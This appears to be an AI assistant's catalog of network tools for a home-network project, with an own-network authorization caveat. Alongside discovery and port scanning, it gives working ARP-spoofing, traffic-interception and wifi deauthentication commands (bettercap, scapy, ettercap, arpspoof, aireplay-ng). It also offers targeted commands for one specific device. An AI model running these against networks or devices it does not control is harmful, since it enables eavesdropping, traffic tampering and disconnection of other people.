# Network Libraries & Tools — Research Catalog

> **Scope & authorization.** This project operates **only on networks the owner controls** (own home/lab network, for defensive testing and self-administration). Several tools below (ARP spoofing / MITM, deauth) are *lawful only on networks you own or are explicitly authorized to test*. Using them against networks or devices you don't control is illegal in most jurisdictions. Every tool here is catalogued for own-network, authorized use.

This document catalogs open-source libraries usable by NetworkRegulator, grouped by task. For each, it lists the key functions/capabilities, how they'd be used from our GUI backend, and cross-platform notes (macOS → Windows → Linux, our priority order). Tools already wired into the project are marked **[IN USE]**; the rest are **[RECOMMENDED]** additions.

---

## Quick answer: "the library that lets a computer imitate the router so all traffic goes through it"

What you're describing is **ARP spoofing / gateway impersonation** (a man-in-the-middle, "MITM", technique). The machine tells every device on the LAN "I am the router (the gateway/default route)," and tells the router "I am that device," so traffic is relayed through your machine. The clearest public library/tool for this is:

### ⭐ bettercap — https://github.com/bettercap/bettercap  (Go; MIT)
The modern successor to ettercap. Its `arp.spoof` module does exactly the gateway-impersonation you asked about.

- `net.probe on` — actively discover every host on the subnet (fills the host list).
- `set arp.spoof.targets <ip,ip,…>` — the victims to spoof (or leave unset for the whole subnet).
- `set arp.spoof.fullduplex true` — poison **both** the targets **and** the gateway, so traffic flows both directions through you.
- `arp.spoof on` — start impersonating the gateway; all target traffic is now routed through this machine.
- `net.sniff on` — capture/inspect the redirected traffic.
- `set net.sniff.filter`, `net.sniff.output` — BPF filter / save to pcap.
- `dns.spoof` module — once you're the gateway, answer DNS queries with addresses you choose.
- `http.proxy` / `https.proxy` modules — transparently intercept/modify web traffic flowing through you.
- `wifi.recon` + `wifi.deauth <BSSID>` — wifi monitor-mode discovery and deauth (overlaps aircrack-ng).
- Scriptable via **caplets** (`.cap` files) — a sequence of the commands above, which is ideal for driving it from our GUI without the user touching a terminal.
- Also exposes a **REST API** (`api.rest` module) — our Python backend can POST commands to bettercap instead of parsing stdout. This is the cleanest integration path.

> On "**especially IP 211**": most likely you mean *targeting the gateway* (commonly `192.168.x.1`, but on your network it may end in `.211`, or `.211` is the device whose traffic you want to route). In bettercap you set `arp.spoof.targets` to the device(s) you want routed, and it spoofs the gateway automatically. If `.211` is actually the *gateway's* address on your LAN, bettercap discovers it automatically from the routing table. **Tell me what `192.168.x.211` is on your network (a device, or the router) and I'll give exact commands/caplet.**

**Cross-platform:** Linux (best — full feature set). macOS (supported; Homebrew `brew install bettercap`; ARP spoof + sniff work on the built-in interface, wifi monitor-mode features need a compatible adapter). Windows (partial; works but driver/npcap caveats, wifi features limited).

**Alternatives for the same job** (see the MITM section below): `ettercap`, `scapy` (write it yourself in ~30 lines), `arpspoof` from the **dsniff** suite.

---

## 1. Device discovery / searching for devices on the network

| Library | Lang | Install | Status |
|---|---|---|---|
| **nmap** (via `python-nmap` / `python-libnmap`) | C core + Py wrapper | `brew install nmap` / `pip install python-nmap` | RECOMMENDED |
| **scapy** | Python | `pip install scapy` | RECOMMENDED |
| **arp-scan** | C | `brew install arp-scan` | RECOMMENDED |
| **python-zeroconf** | Python | `pip install zeroconf` | RECOMMENDED |
| **netdisco** | Python | `pip install netdisco` | RECOMMENDED |
| raw `socket` + ARP table parsing | Python stdlib | built in | **[IN USE]** (our `network_scanner_devices.py` LAN sweep) |

**nmap** — the workhorse. Key capabilities we'd call:
- `-sn` (ping/host discovery, "no port scan") — list live hosts on a subnet. Fast way to populate the device list.
- `-PR` — ARP host discovery on the local segment (most reliable on a LAN).
- `-O` — OS fingerprinting. `-sV` — service/version detection. `--osscan-guess`.
- `-oX` — XML output; `python-libnmap` parses this into objects (`NmapReport`, `NmapHost`, host.address, host.hostnames, host.mac, host.vendor).
- `python-nmap`: `nm.scan(hosts='192.168.1.0/24', arguments='-sn')`, then `nm.all_hosts()`, `nm[host].state()`, `nm[host]['vendor']`.

**scapy** — programmatic, no external binary. Key functions:
- `arping("192.168.1.0/24")` — one-liner ARP sweep returning (answered, unanswered); each answer gives IP + MAC. This is the cleanest own-network device discovery.
- `srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet))` — the manual form.
- `sniff(prn=…, filter="arp")` — passively watch who's on the network.
- Fully cross-platform (needs Npcap on Windows, libpcap on macOS/Linux).

**arp-scan** — `arp-scan --localnet` / `arp-scan -I <iface> <subnet>`: fast ARP sweep, prints IP + MAC + vendor (bundled OUI file). Linux/macOS; no native Windows.

**python-zeroconf** — discover devices advertising via **mDNS/Bonjour** (printers, Chromecasts, HomeKit, `_http._tcp`, `_airplay._tcp`, etc.). `Zeroconf()`, `ServiceBrowser(zc, "_services._dns-sd._udp.local.", handler)`. Great for naming devices that answer a ping but have no reverse DNS.

**netdisco** — higher-level discovery (UPnP + mDNS) used by Home Assistant; returns friendly device types (Roku, Sonos, Hue, etc.).

**Cross-platform note:** our current LAN sweep (`network_scanner_devices.py`) already does a socket/ping + ARP-table read, which is the most portable baseline. nmap/scapy/zeroconf are additive and give richer data (OS, services, friendly names).

---

## 2. Port scanning / fetching open ports

| Library | Lang | Notes | Status |
|---|---|---|---|
| **nmap** | C | the standard; service + version detection | RECOMMENDED |
| **masscan** | C | asynchronous, internet-scale speed | RECOMMENDED (power users) |
| **scapy** | Python | custom SYN/TCP/UDP scans | RECOMMENDED |
| raw `socket` connect scan | Python stdlib | simple TCP connect() per port | **[IN USE]** (our `device_detail.py` open-ports scan) |

**nmap** port-scanning flags we'd expose:
- `-sS` SYN ("half-open") scan — fast, needs root. `-sT` full-connect (no root). `-sU` UDP.
- `-p 1-1024` / `-p-` (all 65535) / `--top-ports 100`.
- `-sV` version detection, `--version-intensity`. `-A` aggressive (OS+version+scripts+traceroute).
- `-T0`..`-T5` timing templates. `--open` (only show open ports).
- **NSE scripts** (`--script`) — huge library: `vuln`, `banner`, `http-title`, `smb-os-discovery`, etc.

**masscan** — `masscan 192.168.1.0/24 -p0-65535 --rate 10000`. Syntax mimics nmap but is asynchronous and extremely fast; good for a quick "what's listening anywhere on my LAN" sweep, then hand specifics to nmap for `-sV`. Linux/macOS; Windows needs Npcap.

**scapy** custom scan — `sr1(IP(dst=ip)/TCP(dport=port, flags="S"))` and inspect the SYN/ACK vs RST flags. Lets us build exactly the scan we want (e.g., stealthier, or UDP) without a dependency on the nmap binary.

**Our current approach** (`device_detail.py`) is a plain TCP `connect()` scan over a port list — portable and dependency-free, but slower and no banner/version info. Adding `-sV` via nmap would give service names (e.g., "22/tcp open ssh OpenSSH 9.6").

---

## 3. MAC address / vendor (OUI) lookup

| Library | Lang | Install | Notes |
|---|---|---|---|
| **mac-vendor-lookup** | Python | `pip install mac-vendor-lookup` | async, local cache, auto-updates IEEE OUI DB |
| **manuf** | Python | `pip install manuf` | uses Wireshark's `manuf` file; offline |
| **netaddr** | Python | `pip install netaddr` | `EUI(mac).oui.registration().org` |
| IEEE OUI CSV | data | download `oui.csv` from IEEE | roll-your-own offline lookup |

**mac-vendor-lookup** — `MacLookup().lookup("00:1A:2B:3C:4D:5E")` → `"Cisco Systems"`. `update_vendors()` refreshes the local DB. `AsyncMacLookup` for non-blocking GUI use. This is the simplest drop-in for showing a vendor name next to each device.

**manuf** — `MacParser().get_manuf(mac)` / `get_manuf_long(mac)`; fully offline (ships the OUI table), good when we don't want network calls at scan time.

**netaddr** — general IP/MAC manipulation library; the OUI org name is a bonus. Also handy for subnet math (`IPNetwork`, `.iter_hosts()`), which we already need to enumerate a /24.

> Vendor from the first 3 MAC octets (the OUI) is a strong hint at device type (Apple, Samsung, Raspberry Pi, Ubiquiti…). Note: devices using **MAC randomization** (modern phones) will show no/variable vendor — worth a tooltip in the UI.

---

## 4. Traffic redirection / man-in-the-middle (router impersonation)

**Lawful only on your own / authorized network.** This is the category your "imitate the router" request falls into. Ordered best-fit first.

**bettercap [RECOMMENDED — primary]** — see the Quick Answer above. `arp.spoof` for gateway impersonation, `net.sniff` to inspect, `dns.spoof`/`http.proxy` to act on the redirected traffic, REST API + caplets for clean GUI control. This is the one I'd build the feature on.

**scapy [RECOMMENDED — DIY/portable]** — implement ARP spoofing ourselves, no external binary:
- Build the poison: `ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)` — tells the victim "the gateway's MAC is mine."
- Mirror it toward the gateway (`psrc=victim_ip`) for full-duplex.
- `send(pkt, loop=1, inter=2)` — resend every 2s to keep the cache poisoned.
- Enable IP forwarding on the host (`sysctl net.inet.ip.forwarding=1` on macOS / `net.ipv4.ip_forward=1` on Linux) so traffic actually passes through instead of dropping.
- Restore on exit: send correct ARP replies so the network heals. **Important for a GUI tool** — always restore.
- Pros: one dependency, works everywhere scapy runs. Cons: we own the reliability/edge cases.

**ettercap** — the classic MITM suite. `ettercap -T -M arp:remote /gateway// /target//`. Mature but older; bettercap is the modern replacement. Linux/macOS.

**arpspoof (dsniff suite)** — minimal, single-purpose: `arpspoof -i <iface> -t <target> <gateway>`. Pair with `sysctl` IP forwarding. Good for scripting a bare-bones version. `brew install dsniff`.

**mitmproxy [RECOMMENDED — the "act on traffic" half]** — once traffic is routed through us, `mitmproxy`/`mitmdump` is the Python-native way to inspect and modify HTTP/HTTPS (requires installing its CA cert on the device for TLS). `pip install mitmproxy`; scriptable with Python addons. Cross-platform. Use alongside the ARP layer above.

**Cross-platform reality for MITM:**
- **Linux** — everything works, cleanest.
- **macOS** — scapy/bettercap/arpspoof ARP spoofing works on the built-in interface; use `sysctl -w net.inet.ip.forwarding=1`. Needs sudo. (This is separate from the wifi monitor-mode limitation that affects *deauth*.)
- **Windows** — possible but fiddly: requires **Npcap** (WinPcap successor) for scapy/bettercap, and IP forwarding via registry/`netsh`. Lowest priority per our platform order.

---

## 5. Wifi deauthentication / disconnecting devices

Already central to the project (aircrack-ng). Disconnecting a device over wifi = sending **deauth frames**, which needs **monitor mode + packet injection**.

| Tool | Notes | Status |
|---|---|---|
| **aircrack-ng suite** (`airmon-ng`, `aireplay-ng`, `airodump-ng`) | `aireplay-ng --deauth` is the core disconnect primitive | **[IN USE]** |
| **bettercap** `wifi.deauth` | same capability inside the bettercap framework | RECOMMENDED |
| **scapy** deauth | craft `Dot11Deauth` frames manually | RECOMMENDED (portable) |
| **kismet** | wireless device/network detection + monitoring (not deauth) | RECOMMENDED (recon) |

**aireplay-ng** key use: `aireplay-ng --deauth <count> -a <AP_BSSID> -c <client_MAC> <mon_iface>` — disconnect a specific client (or broadcast with no `-c`). `airodump-ng` enumerates APs/clients first; `airmon-ng start <iface>` enables monitor mode.

**scapy deauth** — `RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)`, `sendp(..., iface=mon, count=n)`. Portable if the adapter supports injection.

**Hard platform limits (already noted in project memory):**
- **macOS** — the **built-in card cannot inject**; deauth needs a **USB monitor-mode adapter** + `brew install aircrack-ng`. Scan + device-list features work without it.
- **Windows** — standard drivers **can't do monitor mode/injection**; practically scan-only unless a special USB adapter + driver.
- **Linux** — works with injection-capable chipsets (Atheros, some Realtek/Ralink).

---

## 6. Packet capture & analysis (supporting)

| Library | Lang | Use |
|---|---|---|
| **pyshark** | Python (tshark wrapper) | `pip install pyshark`; parse live/offline captures with Wireshark's dissectors |
| **scapy** | Python | `sniff()`, `rdpcap()`, `wrpcap()` — capture, read, write pcap |
| **dpkt** | Python | fast, low-level pcap parsing |
| **libpcap / tcpdump** | C | the underlying capture engine (Npcap on Windows) |

Useful for a "what is this device actually talking to" view once we can see its traffic (either on our own link or via the MITM layer).

---

## Recommended integration plan for NetworkRegulator

1. **Discovery** — keep our portable socket/ARP sweep as the baseline; add **scapy `arping`** (richer, reliable) and **python-zeroconf** (friendly device names). **[builds on current `network_scanner_devices.py`]**
2. **Ports** — keep the TCP connect scan; optionally shell out to **nmap `-sV`** for service/version when the user clicks a device. **[builds on `device_detail.py`]**
3. **Vendor** — add **mac-vendor-lookup** (async) for a vendor column. Cheap, high-value, cross-platform.
4. **Disconnect (wifi)** — keep **aircrack-ng**; document the macOS/Windows adapter requirement in the UI.
5. **Router impersonation / route-through-me** — build on **bettercap** (REST API + a caplet), with a **scapy** fallback for portability. Always auto-restore ARP tables on stop, and gate the feature behind an explicit "I own/authorize this network" confirmation.

---

## Sources
- bettercap — official docs & arpspoof module: https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/ · repo https://github.com/bettercap/bettercap · Kali tool page https://www.kali.org/tools/bettercap
- scapy ARP/ARP-spoof usage: https://packtpub.com/en-gb/product/python-for-security-and-networking-9781837637553 · scapy docs https://scapy.readthedocs.io
- nmap / python-nmap / python-libnmap: https://nmap.org/book/man.html · https://pypi.org/project/python-nmap/ · https://pypi.org/project/python-libnmap/
- masscan: https://github.com/robertdavidgraham/masscan
- mac-vendor-lookup: https://pypi.org/project/mac-vendor-lookup/ · manuf: https://pypi.org/project/manuf/ · netaddr: https://pypi.org/project/netaddr/
- python-zeroconf: https://pypi.org/project/zeroconf/ · netdisco: https://pypi.org/project/netdisco/
- ettercap: https://www.ettercap-project.org · dsniff/arpspoof: https://www.monkey.org/~dugsong/dsniff/
- mitmproxy: https://mitmproxy.org/
- aircrack-ng: https://www.aircrack-ng.org · pyshark: https://pypi.org/project/pyshark/ · dpkt: https://pypi.org/project/dpkt/

*Library capabilities above reflect each project's documented feature set; the two primary MITM tools (bettercap, scapy) were cross-checked against current docs during this research. Exact flag/function names should be re-confirmed against the installed version at implementation time.*
